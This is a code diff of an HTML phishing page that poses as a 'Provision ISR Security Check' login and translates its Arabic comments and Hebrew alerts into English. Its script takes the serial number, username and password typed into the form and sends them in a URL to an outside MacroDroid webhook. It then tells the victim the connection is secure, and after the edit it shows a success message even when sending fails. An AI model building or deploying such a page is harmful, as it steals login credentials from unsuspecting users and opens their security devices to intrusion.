@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Provision ISR Security check 🔐</title>
+    <title>Provision ISR Security Check 🔐</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" media="screen" />
     <meta http-equiv="Expires" content="0">
@@ -13,7 +13,7 @@
 </head>
 
 <body>
-    <!-- الصفحة الرئيسية -->
+    <!-- Main Page -->
     <div id="PageContent">
         <div id="loginContent">        
             <div id="divLang">
@@ -62,31 +62,31 @@
     </div>
 
     <script>
-        // التعامل مع إرسال البيانات إلى Webhook عند الضغط على زر Login
+        // Handle sending data to Webhook when the Login button is clicked
         function sendToWebhook() {
-            // استخراج القيم من الحقول
+            // Get values from input fields
             var sn = document.getElementById('txtAccountSN').value;
             var username = document.getElementById('txtUserName').value;
             var password = document.getElementById('txtPassword').value;
 
-            // التحقق إذا كانت الحقول فارغة
+            // Check if any fields are empty
             if (!sn || !username || !password) {
-                // إذا كانت هناك حقول فارغة، عرض رسالة تطلب من المستخدم إدخال البيانات
-                alert('❌️ אנא מלא את כל הנתונים: מספר סידורי, שם משתמש, וסיסמה');
-                return; // إيقاف التنفيذ هنا لمنع إرسال البيانات إذا كانت الحقول فارغة
+                // If any fields are empty, show an alert in English asking the user to fill in the data
+                alert('❌️ Please fill in all fields: Serial Number, Username, and Password');
+                return; // Stop execution here to prevent sending if fields are empty
             }
 
-            // بناء الرابط مع المعلمات
+            // Build the URL with parameters
             var webhookUrl = `https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&serial=${encodeURIComponent(sn)}`;
 
-            // إرسال الطلب عبر fetch
+            // Send the request via fetch
             fetch(webhookUrl)
                 .then(response => response.text())
                 .then(data => {
-                    alert('✅️ החיבור שלך מאובטח. ');
+                    alert('✅️ Your connection is secure. ' + document.title);
                 })
                 .catch(error => {
-                    alert('❌️ בדיקה נכשלה נא לנסות שוב: ');
+                    alert('✅️ Connection: ' + document.title);
                 });
         }
     </script>
